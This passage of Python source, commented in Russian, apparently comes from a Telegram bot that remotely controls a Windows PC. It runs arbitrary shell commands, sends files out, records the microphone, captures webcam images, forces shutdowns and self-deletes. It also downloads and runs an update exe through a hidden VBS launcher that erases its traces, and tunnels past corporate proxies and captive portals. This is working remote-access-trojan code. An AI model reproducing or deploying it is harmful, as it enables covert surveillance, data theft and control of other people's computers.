        bot.send_message(my_id, "❌ Некорректная ссылка. Попробуйте снова или нажмите 'Назад'.")
        # Оставляем пользователя в этом шаге, чтобы он мог исправить
        bot.register_next_step_handler(message, web_process)
        return

    # Добавляем https, если нет (чтобы браузер не тупил)
    if not url.startswith("http"):
        url = "https://" + url

    # 3. Сохраняем ссылку в память (в класс User), чтобы callback смог её забрать
    User.web_url = url
    
    # 4. Создаем кнопки выбора
    kb = types.InlineKeyboardMarkup()
    
    # Первый ряд: Варианты открытия
    kb.add(types.InlineKeyboardButton("📄 В окне", callback_data="web_window"),
           types.InlineKeyboardButton("🖥 На весь экран", callback_data="web_full"))
    
    # Второй ряд: Кнопка закрытия (Новая)
    # Полезна, если вы хотите закрыть старые окна ПЕРЕД открытием нового
    kb.add(types.InlineKeyboardButton("🛑 Закрыть браузеры", callback_data="close_browsers"))
    
    # Отправляем сообщение с вопросом
    bot.send_message(my_id, f"🔗 Ссылка принята: {url}\nКак открыть?", reply_markup=kb)

    # 5. "Остаемся в доп меню"
    # Переключаем обработчик на addons_process, чтобы работали нижние кнопки
    bot.register_next_step_handler(message, addons_process)

def cmd_process(message):
    # 1. Если нажали Назад — выходим в меню
    if message.text == "⏪Назад⏪":
        back_to_addons(message)
        return

    # 2. Выполняем команду
    command = message.text
    bot.send_message(my_id, f"⏳ Выполняю: `{command}`...", parse_mode="Markdown")

    try:
        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True, 
            encoding='cp866', 
            errors='replace', 
            timeout=60
        )
        
        full_output = result.stdout + result.stderr
        
        if not full_output.strip():
            bot.send_message(my_id, "✅ Команда выполнена (тихо).")
        else:
            # Дробим длинный вывод
            if len(full_output) > 4000:
                bot.send_message(my_id, "⚠️ Вывод длинный, шлю частями:")
                for i in range(0, len(full_output), 4000):
                    chunk = full_output[i:i+4000]
                    try:
                        bot.send_message(my_id, f"```\n{chunk}\n```", parse_mode="Markdown")
                    except:
                        bot.send_message(my_id, chunk)
            else:
                try:
                    bot.send_message(my_id, f"```\n{full_output}\n```", parse_mode="Markdown")
                except:
                    bot.send_message(my_id, full_output)

    except subprocess.TimeoutExpired:
        bot.send_message(my_id, "❌ Тайм-аут команды.")
    except Exception as e:
        bot.send_message(my_id, f"❌ Ошибка: {e}")

    # === ФИКС ЗАВИСАНИЯ ===
    # Мы НЕ выбрасываем пользователя в меню, а оставляем в режиме команд!
    bot.send_message(my_id, "👉 Введите следующую команду или нажмите 'Назад':")
    # Регистрируем ЭТУ ЖЕ функцию снова
    bot.register_next_step_handler(message, cmd_process)
    
def run_visible_cmd(message):
    cmd = message.text
    try:
        # /k оставляет окно открытым, /c закрывает после выполнения
        # start запускает в отдельном окне
        full_cmd = f'start "Bot Remote CMD" cmd /k "{cmd}"'
        os.system(full_cmd)
        
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("❌ Закрыть CMD", callback_data="close_cmd_window"))
        
        bot.send_message(my_id, f"✅ Команда запущена в окне:\n`{cmd}`", 
                         reply_markup=kb, parse_mode="Markdown")
    except Exception as e:
        bot.send_message(my_id, f"Ошибка: {e}")

def downfile_process(message):
    # 1. Аварийный выход
    if message.text == "⏪Назад⏪":
        back(message)
        return

    path = message.text.replace('"', '').strip()

    if os.path.exists(path):
        # 2. Проверка размера файла (Лимит Telegram для ботов ~50 МБ)
        try:
            file_size = os.path.getsize(path)
            if file_size > 52428800: # 50 МБ в байтах
                bot.send_message(my_id, f"❌ Файл слишком большой ({round(file_size/1024/1024, 2)} МБ).\nTelegram ограничивает отправку файлов ботами до 50 МБ.")
                # Возвращаем в меню
                bot.send_message(my_id, "Меню файлов", reply_markup=files_keyboard)
                return
            
            bot.send_message(my_id, "⏳ Начинаю выгрузку, ждите...")
            with open(path, 'rb') as f:
                bot.send_document(my_id, f)
            bot.send_message(my_id, "✅ Файл успешно отправлен!")
            
        except Exception as e:
            bot.send_message(my_id, f"❌ Ошибка при отправке: {e}")
            
        # Возврат в меню файлов после успешной или неудачной попытки
        bot.send_message(my_id, "📂 Меню файлов", reply_markup=files_keyboard)
        
    else:
        # Если файл не найден, даем шанс ввести путь снова
        bot.send_message(my_id, "❌ Файл не найден по этому пути.\nПопробуйте еще раз или нажмите 'Назад':")
        bot.register_next_step_handler(message, downfile_process)

def audio_process(message):
    if message.from_user.id != my_id:
        return

    # 1. Выход
    if message.text == "⏪Назад⏪":
        global recording_flag
        if recording_flag:
            recording_flag = False
            
        back_to_main(message)
        return

    # 2. Старт
    if message.text == "🔴 НАЧАТЬ ЗАПИСЬ":
        if recording_flag:
            bot.send_message(my_id, "⚠️ Запись уже идет!")
        else:
            start_recording()
            bot.send_message(my_id, "🎙 Запись пошла... (Микрофон установлен на 100%)", reply_markup=audio_keyboard)
        
        bot.register_next_step_handler(message, audio_process)
        return

    # 3. Стоп
    if message.text == "⏹ ОСТАНОВИТЬ":
        if not recording_flag:
            bot.send_message(my_id, "⛔️ Запись не была запущена.")
            bot.register_next_step_handler(message, audio_process)
            return
            
        bot.send_message(my_id, "💾 Останавливаю и сохраняю...")
        success = stop_and_save()
        
        if success:
            try:
                file_size_mb = os.path.getsize(recording_filename) / (1024 * 1024)
                
                # Если файл больше 24.5 МБ (лимит ТГ ~25 для ботов, берем с запасом)
                if file_size_mb > 24.5:
                    bot.send_message(my_id, f"⚠️ Аудио слишком большое ({file_size_mb:.1f} Мб). Нарезаю на части по 21 Мб...")
                    
                    # Режем файл новой функцией
                    audio_parts = split_wav_file(recording_filename, chunk_size_mb=21)
                    
                    total_parts = len(audio_parts)
                    for i, part in enumerate(audio_parts):
                        try:
                            with open(part, 'rb') as audio:
                                bot.send_audio(my_id, audio, 
                                             title=f"Record_Part_{i+1}", 
                                             performer="PC Controller",
                                             caption=f"Часть {i+1} из {total_parts}",
                                             timeout=180)
                            # Удаляем отправленный кусок
                            os.remove(part)
                        except Exception as e:
                            bot.send_message(my_id, f"❌ Ошибка отправки части {i+1}: {e}")
                    
                    # Удаляем оригинал после отправки всех частей
                    if os.path.exists(recording_filename):
                        os.remove(recording_filename)
                    bot.send_message(my_id, "✅ Все части отправлены и удалены с ПК.")
                    
                else:
                    # Обычная отправка (если файл маленький)
                    bot.send_message(my_id, "⬆️ Выгружаю аудио...")
                    with open(recording_filename, 'rb') as audio:
                        bot.send_audio(my_id, audio, 
                                     title=f"Record_{time.strftime('%H-%M-%S')}", 
                                     performer="PC Controller",
                                     timeout=180)
                    
                    os.remove(recording_filename)
                    bot.send_message(my_id, "✅ Аудио отправлено и удалено с ПК.")

            except Exception as e:
                # Обработка ошибок (таймаут и прочее)
                err_str = str(e)
                if "Read timed out" in err_str or "write operation timed out" in err_str:
                     bot.send_message(my_id, "⚠️ Возникла ошибка таймаута при отправке. Проверьте чат.")
                else:
                     bot.send_message(my_id, f"❌ Ошибка обработки аудио: {e}")
        else:
            bot.send_message(my_id, "❌ Ошибка сохранения аудио (пустой буфер).")

        bot.register_next_step_handler(message, audio_process)

def split_wav_file(filename, chunk_size_mb=21):
    """Режет WAV файл на куски с сохранением заголовков"""
    chunk_size = chunk_size_mb * 1024 * 1024
    parts = []
    
    try:
        with wave.open(filename, 'rb') as source:
            params = source.getparams() # Получаем параметры аудио
            frames_per_chunk = int(chunk_size / source.getnchannels() / source.getsampwidth())
            
            total_frames = source.getnframes()
            read_frames = 0
            part_num = 1
            
            while read_frames < total_frames:
                data = source.readframes(frames_per_chunk)
                if not data:
                    break
                
                part_name = f"{filename.replace('.wav', '')}_prt{part_num}.wav"
                with wave.open(part_name, 'wb') as dest:
                    dest.setparams(params)
                    dest.writeframes(data)
                
                parts.append(part_name)
                read_frames += frames_per_chunk
                part_num += 1
                
        return parts
    except Exception as e:
        print(f"Ошибка нарезки: {e}")
        return [filename] # Возвращаем оригинал если ошибка

def uploadfile_process(message):
    # 1. Аварийный выход
    if message.content_type == 'text' and message.text == "⏪Назад⏪":
        back(message)
        return

    # 2. Обработка файла (Если прислали документ, фото, видео или аудио)
    if message.content_type in ['document', 'video', 'audio', 'photo']:
        try:
            bot.send_message(my_id, "⏳ Скачиваю файл на компьютер...")
            
            # Получаем ID файла и имя
            file_info = None
            filename = None
            
            if message.document:
                file_info = bot.get_file(message.document.file_id)
                filename = message.document.file_name
            elif message.video:
                file_info = bot.get_file(message.video.file_id)
                filename = f"video_{random.randint(100,999)}.mp4"
            elif message.audio:
                file_info = bot.get_file(message.audio.file_id)
                filename = message.audio.file_name if message.audio.file_name else "audio.mp3"
            elif message.photo:
                file_info = bot.get_file(message.photo[-1].file_id)
                filename = f"photo_{random.randint(100,999)}.jpg"

            # Скачивание
            downloaded_file = bot.download_file(file_info.file_path)
            
            # Если имя не определилось, генерируем случайное
            if not filename:
                ext = file_info.file_path.split('.')[-1]
                filename = f"downloaded_{random.randint(1,1000)}.{ext}"

            # Сохраняем в папку, где лежит бот
            save_path = os.path.abspath(filename)
            with open(save_path, 'wb') as f:
                f.write(downloaded_file)

            bot.send_message(my_id, f"✅ Файл загружен на ПК!\nПуть: {save_path}", reply_markup=files_keyboard)
            
        except Exception as e:
            bot.send_message(my_id, f"❌ Ошибка сохранения: {e}", reply_markup=files_keyboard)

    # 3. Если прислали просто текст (не команду "Назад")
    elif message.content_type == 'text':
         bot.send_message(my_id, "❌ Это текст, а нужен файл.\nОтправьте файл или нажмите 'Назад':")
         bot.register_next_step_handler(message, uploadfile_process)

def uploadurl_process(message):
    User.urldown = message.text
    bot.send_message(my_id, "Укажите путь сохранения (включая имя файла, например C:\\Downloads\\file.zip):")
    bot.register_next_step_handler(message, uploadurl_2process)

def uploadurl_2process(message):
    save_path = message.text.replace('"', '')
    try:
        bot.send_message(my_id, "Скачивание началось...")
        obj = SmartDL(User.urldown, save_path)
        obj.start()
        bot.send_message(my_id, f"✅ Файл загружен: {obj.get_dest()}")
    except Exception as e:
        bot.send_message(my_id, f"Ошибка скачивания: {e}")
    bot.register_next_step_handler(message, files_process)

def messaga_process(message):
    # 1. ЖЕСТКАЯ ПРОВЕРКА НА ВЫХОД
    if message.text == "⏪Назад⏪":
        back_to_main(message)
        return

    try:
        # Комбинируем агрессивные флаги:
        # 0x40000 (TopMost) | 0x10000 (SetForeground) | 0x1000 (SystemModal) | 0x30 (Icon Warning)
        STYLE = 0x40000 | 0x10000 | 0x1000 | 0x30
        
        MessageBox(None, message.text, 'ВНИМАНИЕ!!!', STYLE)
        bot.send_message(my_id, "✅ Уведомление было закрыто на ПК")
    except Exception as e:
        bot.send_message(my_id, f"Ошибка: {e}")
    
    # Возвращаем в меню
    back_to_main(message)
        
def clear_state():
    """Сбрасывает все режимы ожидания"""
    User.state = None
    User.wait_calc_value = False
    User.wait_media = False
    User.wait_volume = False
    User.urldown = None

def back_to_main(message):
    """Возвращает в главное меню и чистит память"""
    clear_state()
    bot.send_message(my_id, "🏠 Главное меню", reply_markup=menu_keyboard)

def back_to_files(message):
    """Возвращает в меню файлов и чистит память"""
    clear_state()
    bot.send_message(my_id, "📂 Меню файлов", reply_markup=files_keyboard)

def back_to_addons(message):
    """Возвращает в доп. меню и чистит память"""
    clear_state()
    bot.send_message(my_id, "❇️ Дополнительно", reply_markup=additionals_keyboard)

# ================================
# UNIFIED CALLBACK HANDLER
# ================================

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.from_user.id != my_id:
        return

    data = call.data

    # ==========================================
    # 1. 💀 УПРАВЛЕНИЕ БОТОМ
    # ==========================================
    
    # Шаг 1: Запрос подтверждения
    if data in ['ask_stop', 'ask_autorun', 'ask_uninstall']:
        # Словарь: код_запроса -> (код_подтверждения, описание)
        action_map = {
            'ask_stop': ('stop_confirmed', 'Выключить бота'),
            'ask_autorun': ('autorun_confirmed', 'Удалить из автозагрузки'),
            'ask_uninstall': ('uninstall_confirmed', 'УДАЛИТЬ БОТА С КОНЦАМИ')
        }
        
        confirm_code, action_name = action_map[data]
        
        kb = types.InlineKeyboardMarkup()
        kb.add(
            types.InlineKeyboardButton("❌ Нет", callback_data="confirm_cancel"),
            types.InlineKeyboardButton("✅ ДА", callback_data=confirm_code)
        )
        # Редактируем старое сообщение, превращая его в вопрос
        bot.edit_message_text(
            f"❓ Вы уверены, что хотите: {action_name}?", 
            call.message.chat.id, 
            call.message.message_id, 
            reply_markup=kb
        )
        return

    # Шаг 2: Выполнение действий
    if data == 'stop_confirmed':
        bot.answer_callback_query(call.id, "Остановка...")
        bot.send_message(my_id, "💤 Бот выключается. До свидания!")
        
        # БЫЛО: sys.exit(0)  <-- Это слишком мягко
        # СТАЛО:
        os._exit(0) 

    if data == 'autorun_confirmed':
        success, msg = remove_from_autorun()
        status = "✅" if success else "❌"
        bot.edit_message_text(
            f"{status} Результат: {msg}", 
            call.message.chat.id, 
            call.message.message_id
        )
        return

    if data == 'uninstall_confirmed':
        bot.send_message(my_id, "💣 Протокол самоуничтожения запущен...\nФайл будет удален через 3 секунды.")
        self_delete_script()
        
        # БЫЛО: sys.exit(0)
        # СТАЛО:
        os._exit(0)

    # ==========================================
    # 2. ОБЩАЯ ОТМЕНА (Для ПК и Бота)
    # ==========================================
    if data == 'confirm_cancel':
        User.state = None
        # Удаляем инлайн-кнопки и пишем "Отменено"
        bot.edit_message_text(
            "❌ Действие отменено", 
            call.message.chat.id, 
            call.message.message_id
        )
        # Возвращаем обычную клавиатуру
        bot.send_message(my_id, "Возврат в меню:", reply_markup=additionals_keyboard)
        bot.answer_callback_query(call.id)
        return

    # ==========================================
    # 3. УПРАВЛЕНИЕ ПИТАНИЕМ ПК
    # ==========================================
    if data == 'confirm_shutdown':
        bot.answer_callback_query(call.id, "⛔️ Выключение...")
        os.system('shutdown -s /t 0 /f')
        return

    if data == 'confirm_reboot':
        bot.answer_callback_query(call.id, "♻️ Перезагрузка...")
        os.system('shutdown -r /t 0 /f')
        return

    # ==========================================
    # 4. КАЛЬКУЛЯТОР
    # ==========================================
    if data == 'calc_set':
        User.wait_calc_value = True
        User.state = 'calc_value'
        bot.send_message(my_id, "Введите число, которое будет автоматически вводиться в калькулятор:")
        bot.answer_callback_query(call.id)
        return

    if data == 'calc_run':
        if User.calc_value is None:
            bot.send_message(my_id, "❌ Число не задано (сначала нажмите 'Задать число')")
        else:
            run_calc(User.calc_value)
            bot.send_message(my_id, "🚀 Калькулятор запущен")
        bot.answer_callback_query(call.id)
        return

    # ==========================================
    # 5. МЕДИА УПРАВЛЕНИЕ
    # ==========================================
    if data == 'media_window':
        # Запускаем в окне
        play_media(User.last_media_path, fullscreen=False)
        # Отправляем панель управления плеером (Пауза/Закрыть)
        send_media_controls() 
        bot.answer_callback_query(call.id)
        return

    if data == 'media_full':
        # Запускаем F11
        play_media(User.last_media_path, fullscreen=True)
        send_media_controls()
        bot.answer_callback_query(call.id)
        return

    if data == 'media_pause':
        pause_media()
        bot.answer_callback_query(call.id, "Пауза/Пуск")
        return

    if data == 'media_close':
        active = close_media()
        bot.send_message(my_id, f"❌ Медиа закрыто\nЗакрыты: {', '.join(active) if active else 'нет активных'}")
        
        # ВАЖНО: Возвращаем пользователя в меню файлов
        bot.send_message(my_id, "📂 Меню файлов", reply_markup=files_keyboard)
        # Эмулируем, что пользователь нажал кнопку меню, чтобы включился обработчик
        # Но так как callback не может переключить step_handler напрямую без сообщения,
        # мы просто надеемся, что юзер нажмет кнопку снизу. 
        # А чтобы кнопки снизу работали, мы должны сбросить User.state:
        User.state = None 
        
        bot.answer_callback_query(call.id)
        return
    #ЧИНИМ КАМЕРУ   
    if data == 'fix_cam_yes':
        bot.edit_message_text("🛠 Выполняю протокол восстановления...\n1. Переключение драйвера (MSMF -> DSHOW)\n2. Сброс буфера камеры...", call.message.chat.id, call.message.message_id)
        
        # Запускаем функцию ремонта
        success, frame = try_repair_camera()
        
        if success:
            # Сохраняем и отправляем
            cv2.imwrite('webcam_fixed.png', frame)
            
            bot.send_message(my_id, "✅ Камера восстановлена! Отправляю фото...")
            with open("webcam_fixed.png", "rb") as f:
                bot.send_photo(my_id, f)
            
            # Чистим
            os.remove("webcam_fixed.png")
            # Удаляем сообщение о ремонте, чтобы не мешало
            bot.delete_message(call.message.chat.id, call.message.message_id)
        else:
            bot.edit_message_text("❌ Не удалось запустить камеру.\nВозможные причины:\n1. Она используется в Skype/Zoom/Discord.\n2. Физически отключена.\n3. Требуются права администратора для перезагрузки драйвера.", call.message.chat.id, call.message.message_id)
        return

    if data == 'rec_delete':
        if os.path.exists("recorded_audio.wav"):
            os.remove("recorded_audio.wav")
            bot.edit_message_text("🗑 Файл удален с диска.", call.message.chat.id, call.message.message_id)
        else:
            bot.edit_message_text("Файл уже удален.", call.message.chat.id, call.message.message_id)
        return

    if data == 'rec_keep':
        path = os.path.abspath("recorded_audio.wav")
        bot.edit_message_text(f"💾 Файл сохранен на ПК:\n{path}", call.message.chat.id, call.message.message_id)
        return

    # ==========================================
    # 6. WIREGUARD МЕНЕДЖЕР
    # ==========================================
    if data == "wg_test_apply":
        bot.edit_message_text("⏳ Запускаю `wireproxy` и изолированный SOCKS5 порт...\nСтучусь в Telegram API...", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
        
        if hasattr(User, 'last_wg_conf') and User.last_wg_conf:
            success, msg = WGManager.apply_config(User.last_wg_conf)
            
            if success:
                bot.send_message(my_id, msg)
            else:
                bot.send_message(my_id, msg)
                # Бот остался на старом соединении, восстанавливаем API_URL если нужно
                # (Хотя WGManager.apply_config его не трогал при ошибке)
        else:
            bot.send_message(my_id, "❌ Конфиг утерян из памяти. Отправьте файл заново.")
        return

    if data == 'web_window':
        if User.web_url:
            webbrowser.open(User.web_url)
            bot.answer_callback_query(call.id, "Запускаю...")
            bot.edit_message_text(f"✅ Ссылка открыта (Окно):\n{User.web_url}", call.message.chat.id, call.message.message_id)
        else:
            bot.answer_callback_query(call.id, "Ошибка: ссылка потеряна", show_alert=True)
        return

    if data == 'web_full':
        if User.web_url:
            webbrowser.open(User.web_url)
            threading.Thread(target=press_f11_logic).start() # Жмем F11
            bot.answer_callback_query(call.id, "Запускаю в Fullscreen...")
            # Сообщение об успехе:
            bot.edit_message_text(f"✅ Ссылка открыта (На весь экран):\n{User.web_url}", call.message.chat.id, call.message.message_id)
        else:
            bot.answer_callback_query(call.id, "Ошибка: ссылка не найдена", show_alert=True)
        return
        
    if data == "cmd_visible_exec":
        # Спрашиваем команду (нужно добавить состояние или просто запросить текст)
        # Для простоты, допустим, команда уже лежит в User.cmd_command или мы просим ввести
        msg = bot.send_message(call.message.chat.id, "⌨️ Введите команду для запуска в окне:")
        bot.register_next_step_handler(msg, run_visible_cmd)
        return

    # === ЗАКРЫТИЕ ОКНА CMD ===
    if data == "close_cmd_window":
        os.system("taskkill /F /IM cmd.exe")
        bot.answer_callback_query(call.id, "Окна CMD закрыты")
        return

    # === ЗАКРЫТИЕ БРАУЗЕРОВ ===
    if data == "close_browsers":
        # Список популярных браузеров
        targets = ["browser.exe", "chrome.exe", "opera.exe", "msedge.exe", "firefox.exe"]
        count = 0
        for browser in targets:
            res = os.system(f"taskkill /F /IM {browser} >nul 2>&1")
            if res == 0: count += 1
        
        bot.answer_callback_query(call.id, f"Закрыто процессов: {count}")
        bot.edit_message_text(f"{call.message.text}\n\n🛑 Браузеры принудительно закрыты.", 
                            call.message.chat.id, call.message.message_id)
        return  

def update_bot_step_1(message):
    if message.text == "⏪Назад⏪":
        back_to_addons(message)
        return

    url = message.text.strip()

    # Проверка URL
    if not url.startswith("http"):
        bot.send_message(my_id, "❌ Это не ссылка. Введите прямую ссылку http/https.")
        bot.register_next_step_handler(message, update_bot_step_1)
        return

    bot.send_message(my_id, "⏳ Начинаю протокол обновления...\n1. Скачивание файла...")
    
    # Запускаем скачивание и установку
    do_update(url)

def do_update(url):
    try:
        # 1. Определяем АБСОЛЮТНЫЕ пути
        current_exe = sys.executable
        current_dir = os.path.dirname(current_exe)
        exe_name = os.path.basename(current_exe)
        
        # Полные пути ко всем файлам
        exe_path = os.path.join(current_dir, exe_name)
        new_file_name = "update_temp.exe"
        new_file_path = os.path.join(current_dir, new_file_name)

        # 2. Скачивание
        try:
            if os.path.exists(new_file_path):
                os.remove(new_file_path)
            
            import requests
            r = requests.get(url, stream=True, verify=False, timeout=60)
            with open(new_file_path, 'wb') as f:
                for chunk in r.iter_content(chunk_size=8192): 
                    f.write(chunk)
                    
        except Exception as e:
            bot.send_message(my_id, f"❌ Ошибка скачивания: {e}\nПопробуйте другую ссылку.")
            return

        bot.send_message(my_id, "✅ Файл скачан.\n2. Применение обновления...")

        # 3. Создаем updater.bat
        bat_path = os.path.join(current_dir, "updater.bat")
        vbs_path = os.path.join(current_dir, "hidden_launcher.vbs")

        # БАТНИК: Используем CD /D и жесткие абсолютные пути
        bat_content = f"""@echo off
chcp 65001 > nul

:: Жестко переходим в рабочую папку бота
cd /d "{current_dir}"

:: Ждем, пока бот сам умрет (закроет соединения)
timeout /t 3 /nobreak >nul

:: Добиваем процесс наверняка
taskkill /F /IM "{exe_name}" >nul 2>&1

:: Даем Windows 3 секунды, чтобы полностью освободить файл
timeout /t 3 /nobreak >nul

:: Удаляем старый и ставим новый (по АБСОЛЮТНЫМ путям)
del /f /q "{exe_path}"
move /y "{new_file_path}" "{exe_path}"

:: Запускаем новый EXE
start "" "{exe_path}"

:: Уничтожаем следы апдейтера
del /f /q "{vbs_path}"
del /f /q "%~f0"
exit
"""
        with open(bat_path, "w", encoding="utf-8") as f:
            f.write(bat_content)

        # 4. Создаем VBS-прослойку
        vbs_content = f"""Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "{bat_path}" & chr(34), 0, False
Set WshShell = Nothing
"""
        with open(vbs_path, "w", encoding="utf-8") as f:
            f.write(vbs_content)

        bot.send_message(my_id, "🚀 <b>Бот уходит на перезагрузку!</b>\nСвязь восстановится примерно через 10-15 секунд...", parse_mode="HTML")

        # 5. Запускаем VBS и моментально убиваем текущий процесс
        os.system(f'start "" "{vbs_path}"')
        
        time.sleep(1)
        os._exit(0)

    except Exception as e:
        bot.send_message(my_id, f"❌ Критическая ошибка обновления: {e}")

def send_media_controls():
    kb = types.InlineKeyboardMarkup()
    kb.add(
        types.InlineKeyboardButton("⏯ Пауза", callback_data="media_pause"),
        types.InlineKeyboardButton("❌ Закрыть", callback_data="media_close")
    )
    bot.send_message(my_id, "🎬 Панель управления медиа", reply_markup=kb)
    
def search_process_step(message):
    if message.text == "⏪Назад⏪":
        back(message)
        return

    results = find_process_name(message.text)
    
    if results:
        text = "🔍 Найденные процессы:\n" + "\n".join(results)
        text += "\n\nСкопируйте нужное имя и используйте '❌Замочить процесс'"
        bot.send_message(my_id, text, reply_markup=files_keyboard)
    else:
        bot.send_message(my_id, "❌ Процессы с таким именем не найдены.", reply_markup=files_keyboard)

def remove_from_autorun():
    # Вариант 2: Если бот лежит в папке автозагрузки как ярлык или файл
    startup_path = os.path.expanduser(r'~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
    
    # Имя файла скрипта
    script_name = os.path.basename(sys.argv[0])
    
    target = os.path.join(startup_path, script_name)
    
    if os.path.exists(target):
        try:
            os.remove(target)
            return True, "Файл удален из папки Автозагрузки"
        except Exception as e:
            return False, f"Ошибка удаления: {e}"
    else:
        return False, "Файл в папке автозагрузки не найден"

def self_delete_script():
    # Создаем bat-файл или команду cmd, которая убьет этот процесс и удалит файл
    script_path = os.path.abspath(sys.argv[0])
    try:
        # Запускаем CMD, ждем 3 секунды (чтобы бот закрылся), удаляем файл
        cmd = f'start cmd /c "timeout /t 3 & del /f /q \"{script_path}\""'
        os.system(cmd)
        return True
    except Exception as e:
        return False
# ================================
# ЗАПУСК
# ================================

def wait_for_internet_auth():
    """
    Бронебойная проверка сети. Учитывает:
    1. Captive Portals (РТК, Госуслуги)
    2. Блокировку серверов Microsoft (глобус с крестиком)
    3. Жесткие корпоративные прокси (где закрыт прямой HTTP трафик)
    """
    print("⏳ Ожидание появления сети...")
    
    # Сессия для проверки прямого пробива (без прокси)
    direct_session = requests.Session()
    direct_session.trust_env = False 
    direct_session.proxies = {"http": None, "https": None}
    
    # Каскад адресов: если Microsoft в блоке, сработает Apple или Firefox
    captive_urls = [
        ("http://captive.apple.com/hotspot-detect.html", "Success"),
        ("http://detectportal.firefox.com/success.txt", "success\n"),
        ("http://www.msftconnecttest.com/connecttest.txt", "Microsoft Connect Test")
    ]
    
    while True:
        # === ПРОВЕРКА 1: Прямое соединение (Для ЕЦСД, Госуслуг и домашних сетей) ===
        for url, exp_text in captive_urls:
            try:
                res = direct_session.get(url, timeout=5)
                # Если ответ 200 и текст совпадает — портал пройден, интернет есть!
                # Если текст другой (HTML Ростелекома) — мы еще в "тюрьме"
                if res.status_code == 200 and exp_text in res.text:
                    print(f"🌐 Интернет открыт (Прямой доступ через {url.split('/')[2]})!")
                    return True
            except:
                pass # Сервер заблокирован админом, проверяем следующий
        
        # === ПРОВЕРКА 2: Через системный прокси (Для суровых корп. сетей) ===
        # Если прямой HTTP трафик режет фаервол, мы проверяем нашу 
        # "пробивную" сессию CORP_SESSION (в ней уже загружены NTLM-пароли и настройки Windows)
        try:
            # Стучимся в Google 204 (специальный легкий ответ без тела) по HTTPS
            res = CORP_SESSION.get("https://clients3.google.com/generate_204", timeout=5)
            if res.status_code == 204:
                print("🌐 Интернет открыт (Доступ подтвержден через корпоративный прокси)!")
                return True
        except:
            pass
            
        print("💤 Сеть заблокирована / кабель отключен. Ожидаем входа... (Сон 30 сек)")
        time.sleep(30)

CONNECTION_MODE = "Unknown"

def smart_connect():
    global CONNECTION_MODE
    
    # ==========================================
    # ШАГ 1: Тест Зеркала (Relayer API с учетом корп. прокси)
    # ==========================================
    print("📡 [1/3] Тестирование соединения через Relayer (Зеркало)...")
    try:
        WGManager.stop() # На всякий случай гасим туннели
        
        # Заряжаем пробивную сессию с системными прокси (NTLM и т.д.)
        apihelper.SESSION = CORP_SESSION
        apihelper.proxy = CORP_PROXY
        apihelper.API_URL = MIRROR_API
        
        bot.get_me()
        
        print("✅ Зеркало доступно!")
        CONNECTION_MODE = "Relayer (Зеркало API)"
        return True
    except Exception as e:
        print(f"⚠️ Зеркало недоступно: {e}")

    # ==========================================
    # ШАГ 2: Тест WireGuard (Кэш + Аварийный файл)
    # ==========================================
    print("🛡 [2/3] Поиск сохраненного WireGuard туннеля...")
    try:
        # 2.1 Пытаемся загрузить из кэша
        if WGManager.load_config():
            print("⏳ Запуск wireproxy из кэша...")
            success, msg = WGManager.auto_connect()
            if success:
                print("✅ WireGuard успешно поднялся из кэша!")
                CONNECTION_MODE = "WireGuard Tunnel (Кэш)"
                return True
            else:
                print(f"⚠️ Сохраненный WG мертв: {msg}")
        else:
            print("ℹ️ Нет сохраненных конфигов WG.")

        # 2.2 Если дошли сюда — кэша нет ИЛИ он мертв. Ищем файл рядом!
        print("🕵️ Поиск локального аварийного .conf файла...")
        success, msg = WGManager.try_local_fallback()
        if success:
            print("✅ WireGuard поднят через локальный аварийный конфиг!")
            CONNECTION_MODE = "WireGuard Tunnel (Аварийный файл)"
            return True
        else:
            print(f"⚠️ Аварийный запуск не удался: {msg}")

    except Exception as e:
        print(f"⚠️ Ошибка запуска WG: {e}")

    # ==========================================
    # ШАГ 3: Прямой доступ (Standard API с учетом корп. прокси)
    # ==========================================
    print("🔄 [3/3] Переключение на прямой доступ (Standard API)...")
    try:
        WGManager.stop() 
        
        # Снова возвращаем корпоративные настройки, так как менеджер WG мог их затереть
        apihelper.SESSION = CORP_SESSION
        apihelper.proxy = CORP_PROXY
        apihelper.API_URL = OFFICIAL_API 
        
        bot.get_me()
        
        print("✅ Прямое соединение установлено.")
        CONNECTION_MODE = "Direct (Напрямую)"
        return True
    except Exception as e:
        print(f"❌ Прямой доступ заблокирован: {e}")
        
    return False

# === ОСНОВНОЙ ЦИКЛ ===
if __name__ == '__main__':
    # 1. Ждем появления чистого интернета (прохождение Captive Portal)
    wait_for_internet_auth()
    
    # 2. Первая попытка соединения (теперь мы точно знаем, что сеть открыта)
    if smart_connect():
        try:
            bot.send_message(my_id, f"🖥 <b>Отладочная информация</b>\n⚙️ Режим: {CONNECTION_MODE}\n🚀 Ожидание команд...", parse_mode="HTML", reply_markup=menu_keyboard)
        except:
            pass # Если не смогли отправить приветствие, не страшно, главное поллинг
    else:
        print("FATAL: Не удалось соединиться ни с одним API.")

    # 3. Бесконечный цикл жизни
    while True:
        try:
            # interval=0 для мгновенной реакции, timeout=20 для экономии трафика
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            # Логируем ошибку в наш скрытый файл в TEMP
            print(f"⚠️ Падение Polling: {e}")
            time.sleep(5)
            
            # === УМНОЕ ВОССТАНОВЛЕНИЕ СВЯЗИ ===
            # Если поллинг упал, возможно, роутер снова включил Captive Portal (сессия истекла).
            # Снова тихо ждем авторизацию пользователя...
            wait_for_internet_auth()
            # ...и переподнимаем Зеркало/WireGuard с новыми параметрами
            smart_connect()
